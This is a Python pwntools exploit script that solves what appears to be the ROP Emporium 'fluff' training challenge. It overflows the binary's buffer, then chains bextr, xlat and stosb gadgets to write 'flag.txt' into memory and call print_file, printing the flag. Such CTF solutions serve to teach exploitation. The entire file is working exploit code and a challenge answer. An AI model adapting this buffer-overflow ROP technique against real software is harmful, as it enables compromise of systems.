from pwn import *

def rbx(rop, value):
	#print("rbx("+str(hex(value))+")")
	rop.raw(p64(0x000000000040062a)) # pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret;
	rop.raw(p64(0x4000))
	rop.raw(p64(value - 0x3ef2))

def al(elf, rop, value, currentValue):
	valueAddress = next(elf.search(value))
	rbx(rop, valueAddress - currentValue)
	rop.raw(p64(0x0000000000400628)) # xlat
	return value

context.arch = "amd64"
context.log_level = "critical"

rdiGadget = 0x00000000004006a3
printFileGadget = 0x0000000000400620

stosGadget = 0x0000000000400639
writeableSection  = 0x0000000000601028

bin = "./fluff"
elf = ELF(bin)
p = elf.process()
#p = gdb.debug(bin, "b print_file\nc")

rop = ROP(elf)
rop.raw(b"i"*40)

rop.raw(rdiGadget)
rop.raw(writeableSection)

lastAl = 0x0b
for b in b"flag.txt":
	lastAl = al(elf, rop, b, lastAl)
	rop.raw(stosGadget)

# Point to writeableSection again after stos fucked it over.
rop.raw(rdiGadget)
rop.raw(writeableSection)

rop.raw(elf.plt["print_file"])


p.recvuntil("> ")

p.sendline(rop.chain())

print(re.search(b"ROPE{(.+?)}", p.recvall()).group(0))

